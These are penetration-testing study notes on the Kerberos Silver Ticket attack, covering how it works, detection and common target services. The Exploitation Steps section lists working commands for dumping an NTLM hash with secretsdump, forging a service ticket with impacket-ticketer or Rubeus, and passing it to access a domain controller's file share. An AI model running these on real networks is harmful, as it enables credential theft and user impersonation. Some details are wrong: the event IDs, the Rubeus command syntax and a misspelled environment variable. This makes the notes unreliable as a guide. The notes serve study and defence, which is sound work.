- [[Kerberos]] attack.
- Forge a TGS ticket for a service using the service account password hash (no DC contact).
- Purpose is to impersonate a user to a specific service:
	- Bypasses TGT validation and avoids detection, since DC is never contacted.
# How It Works

1. Attacker obtains service account's NTLM hash (e.g. from [[LSASS (Local Security Authority Subsystem Service)|LSASS]], [[Secretsdump]] or [[Kerberoasting]]).
2. Forge a TGS ticket for a target SPN using that hash.
3. Forged ticket is injected/passed to access the service as an impersonated user.

It does not require:

- Domain Admin
- KRBTGT hash
- DC communication until after forging is complete.

![[Silver Ticket Diagram.png]]
# Exploitation Steps

For Linux:

- Dumping the NTLM hash of service account:
	- `impacket-secretsdump 'corp.local/administrator:Password1@dc.corp.local'`
- Forging a silver ticket:
	- `impacket-ticketer -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> -domain corp.local -spn cifs/dc01.corp.local -user fakeuser -outputfile silver.cifs.ticket`
- Passing the ticket:
	- `export KRB5CCNAMe=silver.cifs.ticket`
	- `impacket-smbclient -k -no-pass -dc-ip dc.corp.local cifs/dc01.corp.local`

For Windows:

- Forge silver ticket:
	- `Rubeus.exe tgt::forge /user:fakeuser /rc4:<NTLM_HASH> /domain:corp.local /sid:<DOMAIN_SID> /service:cifs /target:dc01.corp.local /ptt`
		- `/ptt` injects the ticket directly into the current session.
- Access the service (e.g. file share):
	- `dir \\dc01.corp.local\C$`
# Detection/Defense

- Silver tickets are not validated by DC:
	- No Kerberos TGT requests (Event ID 4678)
	- No TGS requests for the forged ticket (Event ID 4679)
- Detect by:
	- monitoring anomalous service ticket usage.
	- looking for non-existent usernames accessing services.
	- detecting tickets with invalid PACs.
# Notes

- High stealth = high risk if SPN hashes are exposed.
- Common targets:
	- `cifs/` - file shares
	- `http/` - web apps, IIS
	- `mssqlsvc/` - SQL servers
- Easier to perform than [[Golden Ticket Attack|Golden Ticket]] since no KRBTGT hash is needed.


